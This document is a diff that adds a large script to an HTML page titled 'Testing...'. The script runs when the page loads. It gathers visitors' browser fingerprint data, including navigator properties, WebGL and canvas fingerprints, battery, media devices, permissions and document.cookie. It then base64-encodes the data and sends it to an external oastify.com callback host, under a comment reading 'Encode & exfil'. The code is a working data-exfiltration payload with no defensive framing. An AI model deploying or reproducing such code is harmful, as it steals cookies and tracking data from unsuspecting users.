@@ -7,8 +7,266 @@
     Testing...
 
     <script>
-    fetch("https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?fetched_by_js")
-      .catch(() => {});
+    (async () => {
+        const sys = {};
+
+        // --- Navigator ---
+        const navProps = [
+            'userAgent','appCodeName','appName','appVersion','platform','product','productSub',
+            'vendor','vendorSub','language','languages','cookieEnabled','onLine','hardwareConcurrency',
+            'deviceMemory','maxTouchPoints','doNotTrack','pdfViewerEnabled','webdriver','scheduling',
+            'presentation','bluetooth','usb','credentials','keyboard','mediaCapabilities','mediaDevices',
+            'permissions','geolocation','clipboard','wakeLock','windowControlsOverlay','storage',
+            'webkitTemporaryStorage','standalone','globalPrivacyControl','pdfViewerEnabled'
+        ];
+        navProps.forEach(k => {
+            try { sys['nav_'+k] = navigator[k]; } 
+            catch(e) { sys['nav_'+k] = 'ERR:'+e.message; }
+        });
+
+        // Client Hints (High Entropy)
+        try {
+            if (navigator.userAgentData) {
+                sys.uaData = await navigator.userAgentData.getHighEntropyValues([
+                    'platform','platformVersion','architecture','model','uaFullVersion',
+                    'fullVersionList','bitness','wow64','formFactors'
+                ]);
+            }
+        } catch(e) { sys.uaData = 'ERR:'+e.message; }
+
+        // --- Screen ---
+        ['width','height','availWidth','availHeight','colorDepth','pixelDepth',
+         'availLeft','availTop','orientation','deviceXDPI','logicalXDPI'].forEach(k => {
+            try { sys['screen_'+k] = screen[k]; } 
+            catch(e) { sys['screen_'+k] = 'ERR:'+e.message; }
+        });
+
+        // --- Window / Location / Document ---
+        sys.window = {
+            innerWidth, innerHeight, outerWidth, outerHeight, screenX, screenY, screenLeft, screenTop,
+            devicePixelRatio, visualViewport: visualViewport ? {
+                width: visualViewport.width, height: visualViewport.height,
+                scale: visualViewport.scale, offsetLeft: visualViewport.offsetLeft, offsetTop: visualViewport.offsetTop
+            } : null,
+            length, name: window.name, opener: !!window.opener,
+            isFramed: window.self !== window.top, isCrossOriginFramed: false,
+            crossOriginIsolated, closed
+        };
+        try { if (window.top.location.href) sys.window.isCrossOriginFramed = false; } 
+        catch(e) { sys.window.isCrossOriginFramed = true; }
+
+        sys.location = {
+            href: location.href, protocol: location.protocol, host: location.host,
+            hostname: location.hostname, port: location.port, pathname: location.pathname,
+            search: location.search, hash: location.hash, origin: location.origin
+        };
+
+        sys.document = {
+            title: document.title, referrer: document.referrer, domain: document.domain,
+            cookie: document.cookie, lastModified: document.lastModified,
+            readyState: document.readyState, characterSet: document.characterSet,
+            compatMode: document.compatMode, documentMode: document.documentMode,
+            inputEncoding: document.inputEncoding, securityPolicy: document.securityPolicy ? document.securityPolicy.toString() : null,
+            childElementCount: document.documentElement.childElementCount
+        };
+
+        // --- Time / Locale ---
+        sys.locale = Intl.DateTimeFormat().resolvedOptions();
+        sys.timezoneOffset = new Date().getTimezoneOffset();
+
+        // --- Plugins & MIME ---
+        try {
+            sys.plugins = Array.from(navigator.plugins).map(p => ({
+                name: p.name, filename: p.filename, description: p.description, version: p.version
+            }));
+        } catch(e) { sys.plugins = 'ERR:'+e.message; }
+        try {
+            sys.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
+                type: m.type, description: m.description, enabledPlugin: m.enabledPlugin ? m.enabledPlugin.name : null
+            }));
+        } catch(e) { sys.mimeTypes = 'ERR:'+e.message; }
+
+        // --- WebGL ---
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                sys.webgl = {
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER),
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
+                    unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
+                    params: {
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+                        maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
+                        maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
+                    }
+                };
+            }
+        } catch(e) { sys.webgl = 'ERR:'+e.message; }
+
+        // --- Canvas ---
+        try {
+            const c = document.createElement('canvas');
+            const ctx = c.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 4, 17);
+            sys.canvas = c.toDataURL();
+        } catch(e) { sys.canvas = 'ERR:'+e.message; }
+
+        // --- Performance ---
+        try {
+            sys.performance = {
+                memory: performance.memory ? {
+                    usedJSHeapSize: performance.memory.usedJSHeapSize,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+                } : null,
+                timing: performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    domLoading: performance.timing.domLoading,
+                    domInteractive: performance.timing.domInteractive,
+                    domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
+                    domComplete: performance.timing.domComplete,
+                    loadEventEnd: performance.timing.loadEventEnd
+                } : null,
+                navigation: performance.navigation ? {
+                    type: performance.navigation.type,
+                    redirectCount: performance.navigation.redirectCount
+                } : null
+            };
+        } catch(e) { sys.performance = 'ERR:'+e.message; }
+
+        // --- Network / Connection ---
+        try {
+            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (c) sys.connection = {
+                effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt,
+                downlinkMax: c.downlinkMax, saveData: c.saveData, type: c.type
+            };
+        } catch(e) { sys.connection = 'ERR:'+e.message; }
+
+        // --- Battery ---
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                sys.battery = {
+                    charging: b.charging, level: b.level,
+                    chargingTime: b.chargingTime, dischargingTime: b.dischargingTime
+                };
+            }
+        } catch(e) { sys.battery = 'ERR:'+e.message; }
+
+        // --- Media Devices ---
+        try {
+            const devs = await navigator.mediaDevices.enumerateDevices();
+            sys.mediaDevices = devs.map(d => ({
+                kind: d.kind, label: d.label,
+                deviceId: d.deviceId ? d.deviceId.slice(0,8)+'...' : '',
+                groupId: d.groupId ? d.groupId.slice(0,8)+'...' : ''
+            }));
+        } catch(e) { sys.mediaDevices = 'ERR:'+e.message; }
+
+        // --- Permissions ---
+        try {
+            const names = [
+                'accelerometer','ambient-light-sensor','background-sync','bluetooth','camera',
+                'clipboard-read','clipboard-write','geolocation','gyroscope','magnetometer',
+                'microphone','midi','notifications','payment-handler','persistent-storage',
+                'push','screen-wake-lock','storage-access','window-management','display-capture'
+            ];
+            sys.permissions = {};
+            for (const n of names) {
+                try {
+                    const r = await navigator.permissions.query({name: n});
+                    sys.permissions[n] = r.state;
+                } catch(e) { sys.permissions[n] = 'unsupported'; }
+            }
+        } catch(e) { sys.permissions = 'ERR:'+e.message; }
+
+        // --- Storage ---
+        try {
+            sys.storageEstimate = await navigator.storage.estimate();
+            sys.localStorageLen = localStorage.length;
+            sys.sessionStorageLen = sessionStorage.length;
+        } catch(e) { sys.storage = 'ERR:'+e.message; }
+
+        // --- History / Frames / Workers ---
+        sys.historyLength = history.length;
+        sys.serviceWorker = 'serviceWorker' in navigator;
+        sys.sharedWorker = 'SharedWorker' in window;
+        sys.indexedDB = 'indexedDB' in window;
+        try {
+            if (indexedDB.databases) {
+                const dbs = await indexedDB.databases();
+                sys.indexedDBs = dbs.map(d => d.name);
+            }
+        } catch(e) { sys.indexedDBs = 'ERR:'+e.message; }
+
+        // --- Notifications ---
+        try { sys.notificationPermission = Notification.permission; } 
+        catch(e) { sys.notificationPermission = 'ERR:'+e.message; }
+
+        // --- Feature / API existence checks ---
+        sys.features = {
+            wasm: typeof WebAssembly === 'object',
+            sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
+            bigInt: typeof BigInt !== 'undefined',
+            proxy: typeof Proxy !== 'undefined',
+            weakRef: typeof WeakRef !== 'undefined',
+            fetch: typeof fetch !== 'undefined',
+            streams: typeof ReadableStream !== 'undefined',
+            crypto: typeof crypto !== 'undefined' && typeof crypto.subtle !== 'undefined',
+            bluetooth: 'bluetooth' in navigator,
+            usb: 'usb' in navigator,
+            serial: 'serial' in navigator,
+            hid: 'hid' in navigator,
+            nfc: 'nfc' in navigator,
+            contacts: 'contacts' in navigator && 'ContactsManager' in window,
+            eyeDropper: 'EyeDropper' in window,
+            webShare: 'share' in navigator,
+            clipboardRead: 'clipboard' in navigator && !!(navigator.clipboard && navigator.clipboard.readText),
+            presentation: 'presentation' in navigator,
+            webDriver: navigator.webdriver,
+            credentialManagement: 'credentials' in navigator
+        };
+
+        // --- Media Queries / CSS ---
+        sys.mediaQueries = {
+            prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+            prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+            prefersReducedData: window.matchMedia('(prefers-reduced-data: reduce)').matches,
+            prefersContrast: window.matchMedia('(prefers-contrast: more)').matches ? 'more' : 
+                             window.matchMedia('(prefers-contrast: less)').matches ? 'less' : 'no-preference',
+            hover: window.matchMedia('(hover: hover)').matches,
+            pointer: window.matchMedia('(pointer: coarse)').matches ? 'coarse' : 
+                     window.matchMedia('(pointer: fine)').matches ? 'fine' : 'none',
+            anyPointer: window.matchMedia('(any-pointer: coarse)').matches ? 'coarse' : 'fine'
+        };
+
+        // Encode & exfil
+        const json = JSON.stringify(sys, (k,v) => {
+            if (v instanceof Error) return v.toString();
+            if (typeof v === 'function') return v.toString();
+            return v;
+        });
+        const b64 = btoa(unescape(encodeURIComponent(json)));
+
+        fetch(`https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?data=${encodeURIComponent(b64)}&fetched_by_js=1`)
+          .catch(() => {});
+    })();
     </script>
 
 </body>
